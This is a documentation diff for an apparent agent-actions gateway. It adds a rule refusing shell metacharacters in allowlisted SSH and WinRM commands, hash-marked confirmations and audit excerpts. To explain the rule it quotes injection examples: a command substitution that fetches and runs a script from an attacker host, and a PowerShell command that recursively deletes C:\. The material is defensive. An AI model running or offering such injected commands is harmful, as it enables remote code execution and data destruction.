@@ -489,7 +489,9 @@ Everything in "Calling a `sql` target" applies, with four differences:
    `policy_denied` with `detail.reason: "statement_pattern"`.
 3. **A human confirms it**, unless you untick **Ask a human to confirm every non-read call**.
    The agent's client shows the target, the destination (host, port and database only) and the
-   statement, and asks for one tick. The confirmation lasts two minutes, is bound to this call's
+   statement — every line of it quoted with `>`, and, when it is longer than 1 KiB, its head and
+   its tail with an unquoted line saying how much is missing and the SHA-256 of the whole — and
+   asks for one tick. The confirmation lasts two minutes, is bound to this call's
    exact arguments and to this target at this revision, and cannot be used twice: editing the
    target, changing a parameter, retrying with another token or answering late all fail
    (`confirmation_invalid`, `confirmation_expired`, `confirmation_reused`). A client that cannot
@@ -545,7 +547,7 @@ The login name is part of the destination, not the vault item, so one key item c
 targets.
 
 **Policy.** Either **allowed commands** — one glob pattern per line, matched against the whole
-command, where `*` matches any run of characters except a newline — or **allow any command**.
+command, where `*` matches any run of characters except a line break — or **allow any command**.
 Exactly one of the two: a target with neither allows nothing, and a target with both is refused.
 
 ```text
@@ -557,6 +559,27 @@ journalctl -u nginx --since * --no-pager
 Patterns are matched against the exact command the agent sends, anchored at both ends and
 case-sensitively. A pattern that would match everything (`*`) is refused at save: saying
 "anything" is a separate, deliberate decision.
+
+### What a `*` can and cannot do
+
+A wildcard fills in an argument. It does not open a shell. On a target that is not an
+any-command one, a command containing `;`, `&`, `|`, a backtick, `$`, `<`, `>`, `(` or `)` is
+refused before anything connects, with `detail.reason: "command_metacharacter"` — the same way a
+line break is refused. Without that rule a single wildcard would be a shell: `journalctl -u nginx
+--since *` would have admitted `journalctl -u nginx --since $(curl -s http://attacker/p | sh)`,
+and bounding the wildcard on both sides would not have helped, because command substitution sits
+inside the run the `*` matches. Every allowlist holding a wildcard would then have been an
+any-command target without the deployment switch, the warning on the page, `unrestricted: true`
+in `actions_list_targets` or the full command in the audit trail.
+
+A pattern that itself contains one of those characters is refused at save, because no command
+that matched it could ever be allowed.
+
+What a wildcard still gives away is the rest of the **allowed program's** own command line. A
+program that can be told to run something — `find -exec`, `tar --to-command`, `awk`, an
+interpreter — hands over everything the login can do without needing a single metacharacter, so
+bound the pattern as tightly as the work allows, and keep the login as small as the next section
+describes. The login is the control.
 
 ### Giving the target its own user
 
@@ -601,12 +624,14 @@ An agent whose token holds `actions:ssh` and whose client you granted the target
 }
 ```
 
-`command` is at most 16 KiB, may not contain a NUL byte, and may not contain a newline or
-carriage return unless the target is an any-command one; an optional `stdin` (at most 64 KiB) is
-written to the command and closed, so a command that reads until end of file finishes.
+`command` is at most 16 KiB, may not contain a NUL byte, and may not contain a newline, a
+carriage return or a shell metacharacter (`;`, `&`, `|`, a backtick, `$`, `<`, `>`, `(`, `)`)
+unless the target is an any-command one; an optional `stdin` (at most 64 KiB) is written to the
+command and closed, so a command that reads until end of file finishes.
 
-The command is matched against the allowlist **before anything connects**; a command no pattern
-matches is `policy_denied` with `detail.reason: "command"`. Then one connection is opened to the
+The command is matched against the allowlist **before anything connects**; a command holding a
+shell metacharacter is `policy_denied` with `detail.reason: "command_metacharacter"`, and a
+command no pattern matches is `policy_denied` with `detail.reason: "command"`. Then one connection is opened to the
 address the host name resolved to, the presented host key is checked against the pinned one, the
 credential is offered (and only the one method the mapping names: no agent, no
 keyboard-interactive fallback), and one exec channel runs the command with no pseudo-terminal, no
@@ -681,9 +706,11 @@ targets.
 nothing re-parses the quoting the agent wrote; `cmd` sends a command line for `cmd.exe` to parse.
 Prefer PowerShell unless you are allowing a classic console tool.
 
-**Policy.** Exactly as `ssh`: either **allowed commands**, one glob pattern per line matched
-against the whole command, or **allow any command** behind
-`VAULTGATE_ACTIONS_ALLOW_ANY_COMMAND=true`.
+**Policy.** Exactly as `ssh`, including the metacharacter rule and what a `*` can and cannot do:
+either **allowed commands**, one glob pattern per line matched against the whole command, or
+**allow any command** behind `VAULTGATE_ACTIONS_ALLOW_ANY_COMMAND=true`. PowerShell reads `;`,
+`|`, `&`, `$(…)` and `(…)` as operators just as a POSIX shell does, so `Get-Service -Name *`
+admits a service name and not `Spooler; Remove-Item C:\ -Recurse`.
 
 ```text
 Get-ComputerInfo
@@ -717,9 +744,9 @@ An agent whose token holds `actions:winrm` and whose client you granted the targ
 ```
 
 `command` is at most 16 KiB, may not contain a NUL byte or any other control character (tab,
-carriage return and newline excepted), and may not contain a newline or carriage return unless
-the target is an any-command one; an optional `stdin` (at most 64 KiB) is written to the command
-and closed.
+carriage return and newline excepted), and may not contain a newline, a carriage return or a
+shell metacharacter (`;`, `&`, `|`, a backtick, `$`, `<`, `>`, `(`, `)`) unless the target is an
+any-command one; an optional `stdin` (at most 64 KiB) is written to the command and closed.
 
 The command is matched against the allowlist **before anything connects**. Then one connection is
 opened to the address the host name resolved to, the certificate is checked against the pin where
@@ -765,7 +792,9 @@ read back.
 **Unexpected writes**, linked from the Actions section, is the same trail across every target,
 narrowed to the calls that matter when something has gone wrong: every call that was not a read
 and that no human accepted through a confirmation, newest first, with the time, the target, the
-client, the tool, the classification, the outcome and an excerpt of the arguments. A target that
+client, the tool, the classification, the outcome and an excerpt of the arguments; an excerpt
+that was cut at the 4 KiB limit says so and carries the SHA-256 of the whole, so a long statement
+can still be identified. A target that
 asks for confirmation on every non-read call appears here only when one was declined, cancelled,
 expired or refused; a target with the confirmation off appears here for every write it makes,
 which is the point. The rows of a deleted target stay (the audit trail outlives the target) and
